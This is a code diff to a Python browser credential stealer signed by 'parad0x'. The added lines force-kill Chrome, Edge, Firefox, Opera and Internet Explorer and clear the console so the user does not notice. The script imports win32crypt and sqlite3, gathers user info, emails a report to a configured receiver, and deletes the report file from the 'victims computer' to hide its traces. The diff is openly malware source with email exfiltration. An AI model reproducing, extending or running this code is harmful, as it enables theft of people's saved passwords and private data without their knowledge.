@@ -1,4 +1,7 @@
 ## madeby parad0x 20/10/19 8:48pm ##
+## DEBUGGED: by parad0x 21/10/19 2:39am ##
+
+# Bugs Fixed #
 
 #imports
 import os
@@ -14,10 +17,28 @@ import requests
 import sqlite3
 import win32crypt
 
-# kill chrome.exe
+## kill browsers ##
 browserExe = "chrome.exe"
+# kills chrome
 os.system("taskkill /f /im "+browserExe)
-# clears console, making it invisible to user that we killed chrome's process
+os.system("cls")
+# kills microsoft edge
+os.system("taskkill /f /im MicrosoftEdge.exe")
+os.system("cls")
+os.system("taskkill /f /im MicrosoftEdgeCP.exe")
+os.system("cls")
+os.system("taskkill /f /im MicrosoftEdgeSH.exe")
+os.system("cls")
+# kills firefox
+os.system("taskkill /f /im firefox.exe")
+os.system("cls")
+# kills opera
+os.system("taskkill /f /im opera.exe")
+os.system("cls")
+# kills internet explorer
+os.system("taskkill /f /im iexplorer.exe")
+os.system("cls")
+# clears console, making it invisible to user that we killed browser's process
 os.system("cls")
 
 # gather user info
@@ -63,9 +84,9 @@ def send_stuff():
     mail_content = 'INSTRUCTIONS:\n• Attachment name is noname, please rename it with .txt at the end of it.\n• This was sent by parad0x and Snavellet.\n'
 
     #email 
-    sender_address = 'SENDER ADDRESS'
-    sender_pass = 'SENDER PASS'
-    receiver_address = 'RECEIVER ADDRESS'
+    sender_address = 'exampleemail@address.com' # replace '' with your details
+    sender_pass = 'examplepassword'
+    receiver_address = 'examplereceiver@address.com'
 
     #setup mime
     message = MIMEMultipart()
@@ -96,3 +117,5 @@ if __name__ == '__main__':
 	send_stuff()
 # removes .txt file from victims computer
 os.remove('report.txt')
+print("You may now close the program")
+time.sleep(60)
